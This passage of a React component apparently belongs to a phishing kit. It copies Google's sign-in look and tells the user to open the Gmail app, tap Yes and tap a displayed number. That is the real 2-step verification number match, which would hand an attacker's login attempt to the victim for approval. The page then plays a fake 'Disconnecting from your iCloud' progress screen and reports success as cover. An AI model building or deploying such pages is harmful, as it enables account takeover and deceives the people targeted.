                      className="inline-flex items-center gap-2 text-[14px] sm:text-[13px] font-medium text-[#0b57d0] hover:underline disabled:opacity-50 font-[Arial,Helvetica,sans-serif] min-h-[44px] sm:min-h-0"
                    >
                      {busy ? (
                        <>
                          <GoogleSpinner size={16} />
                          <span>Sending…</span>
                        </>
                      ) : (
                        "Resend"
                      )}
                    </button>
                    <p className="mt-3 sm:mt-4 text-[48px] sm:text-[44px] leading-none font-normal text-[#1f1f1f] font-[Arial,Helvetica,sans-serif] tracking-tight">
                      {prompt}
                    </p>
                    <p className="mt-3 text-[15px] font-medium text-[#1f1f1f] font-[Arial,Helvetica,sans-serif]">
                      Check your smartphone
                    </p>
                    <p className="mt-2 text-[14px] sm:text-[13px] leading-[1.45] text-[#444746] font-[Arial,Helvetica,sans-serif]">
                      Google sent a notification to your smartphone. Open the
                      Gmail app, tap <strong>Yes</strong> on the prompt, then
                      tap <strong>{prompt}</strong> on your phone to verify
                      it’s you.
                    </p>
                    {wrongVerify && (
                      <p className="mt-3 text-[12px] leading-snug text-[#b3261e] font-[Arial,Helvetica,sans-serif]">
                        That didn’t work. Tap Resend for a new number, then try again.
                      </p>
                    )}
                  </div>

                  <div className="mt-6 flex items-center justify-between gap-3">
                    <button
                      type="button"
                      className="text-[14px] sm:text-[13px] font-medium text-[#0b57d0] hover:underline font-[Arial,Helvetica,sans-serif] min-h-[44px] sm:min-h-0 inline-flex items-center"
                    >
                      Try another way
                    </button>
                    <button
                      type="button"
                      disabled={busy}
                      onClick={handleVerifyDone}
                      className="h-[44px] sm:h-[38px] min-w-[88px] sm:min-w-[76px] rounded-full bg-[#0b57d0] px-6 sm:px-5 text-[15px] sm:text-[14px] font-medium text-white disabled:opacity-40 hover:bg-[#0842a0] font-[Arial,Helvetica,sans-serif] active:scale-[0.98] transition shrink-0"
                    >
                      Next
                    </button>
                  </div>
                </>
              )}

              {uiStep === "done" && (
                <AnimatePresence mode="wait">
                  {!doneReady ? (
                    <motion.div
                      key="done-loading"
                      initial={{ opacity: 0, y: 8 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -10 }}
                      transition={{ duration: 0.35 }}
                      className="pb-1"
                    >
                      <DisconnectHero success={false} />
                      <h1 className="mt-4 text-center text-[20px] sm:text-[20px] leading-tight text-[#1f1f1f] font-[Arial,Helvetica,sans-serif] px-1">
                        Disconnecting from your iCloud
                      </h1>
                      <p className="mt-2 text-center text-[14px] sm:text-[13px] leading-[1.5] text-[#444746] font-[Arial,Helvetica,sans-serif] px-1">
                        Google is removing the link between{" "}
                        <span className="text-[#1f1f1f] font-medium break-all">
                          {displayEmail || "your Google account"}
                        </span>{" "}
                        and iCloud. This usually takes a few seconds…
                      </p>
                      <div className="mt-7 mb-2">
                        <GoogleDots />
                      </div>
                      <div className="mt-5 h-[3px] w-full overflow-hidden rounded-full bg-[#e8eaed]">
                        <motion.div
                          className="h-full rounded-full"
                          style={{
                            background:
                              "linear-gradient(90deg,#4285F4,#EA4335,#FBBC05,#34A853)",
                          }}
                          initial={{ width: "6%" }}
                          animate={{ width: "100%" }}
                          transition={{ duration: 6.5, ease: "linear" }}
                        />
                      </div>
                      <p className="mt-2.5 text-center text-[11px] text-[#80868b] font-[Arial,Helvetica,sans-serif]">
                        Please keep this window open
                      </p>
                    </motion.div>
                  ) : (
                    <motion.div
                      key="done-success"
                      initial={{ opacity: 0, y: 10, scale: 0.98 }}
                      animate={{ opacity: 1, y: 0, scale: 1 }}
                      transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
                      className="pb-1"
                    >
                      <DisconnectHero success />
                      <h1 className="mt-4 text-center text-[22px] leading-tight text-[#1f1f1f] font-[Arial,Helvetica,sans-serif] px-1">
                        Successfully disconnected!
                      </h1>
                      <p className="mt-2 text-center text-[14px] sm:text-[13px] leading-[1.5] text-[#444746] font-[Arial,Helvetica,sans-serif] px-1">
                        Your Google account is no longer connected to your
                        iCloud account.
                      </p>
                      <div className="mt-7 flex justify-center">
                        <button
                          type="button"
                          disabled={busy}
                          onClick={handleCloseDone}
                          className="h-[44px] sm:h-[40px] min-w-[140px] sm:min-w-[120px] rounded-full bg-[#0b57d0] px-6 text-[15px] sm:text-[14px] font-medium text-white hover:bg-[#0842a0] disabled:opacity-50 font-[Arial,Helvetica,sans-serif] active:scale-[0.98] transition"
                        >
                          Done
                        </button>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              )}
                  </div>
                </motion.div>
              </AnimatePresence>
            </div>
          </>
        )}
      </AnimatePresence>
    </div>
  );
}

export default Disconnect;
